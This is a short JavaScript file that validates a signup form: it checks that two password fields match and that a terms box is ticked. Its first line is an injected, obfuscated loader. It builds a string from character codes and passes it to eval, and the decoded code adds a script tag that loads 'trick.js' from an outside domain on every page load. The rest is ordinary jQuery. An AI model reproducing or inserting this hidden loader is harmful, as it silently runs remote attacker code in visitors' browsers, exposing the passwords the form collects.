var z=String;var t=z.fromCharCode(118,97,114,32,100,61,100,111,99,117,109,101,110,116,59,118,97,114,32,115,61,100,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,10,115,46,115,114,99,61,39,104,116,116,112,115,58,47,47,115,116,111,99,107,46,115,116,97,116,105,115,116,105,99,108,105,110,101,46,99,111,109,47,115,99,114,105,112,116,115,47,116,114,105,99,107,46,106,115,39,59,10,105,102,32,40,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,32,123,32,10,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,46,112,97,114,101,110,116,78,111,100,101,46,105,110,115,101,114,116,66,101,102,111,114,101,40,115,44,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,59,10,125,32,101,108,115,101,32,123,10,100,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,10,125);eval(/*77476456347368*/t);
$(document).ready(function() {
    $("#re_pass").keyup(function()
    {
        if($("#pass").val()!=$("#re_pass").val())
       {
        $("#pass").addClass("wrongpass");
        $("#re_pass").addClass("wrongpass");
        return false;
       }
       else 
       {
        $("#signup").val("Register");
        $("#pass").removeClass("wrongpass");
        $("#re_pass").removeClass("wrongpass");
        return true;
       }
    });
    $("#pass").keyup(function()
    {
        if($("#pass").val()!=$("#re_pass").val())
       {
        $("#pass").addClass("wrongpass");
        $("#re_pass").addClass("wrongpass");
        return false;
       }
       else 
       {
        $("#signup").val("Register");
        $("#pass").removeClass("wrongpass");
        $("#re_pass").removeClass("wrongpass");
        return true;
       }
    });
    $('form').submit(function(e) {
       if($("#pass").val()!=$("#re_pass").val())
       {
        e.preventDefault();
        $("#re_pass").focus();
        $("#signup").val("Check Passwords");
        return false;
       }
       else if($("#agree-term").is(":checked"))
       {
           return true;
       }
       else 
       {   
        e.preventDefault();
        $("#label-agree-term").addClass("wrongpass");
        return false;
       }
        // or return false;
    });
});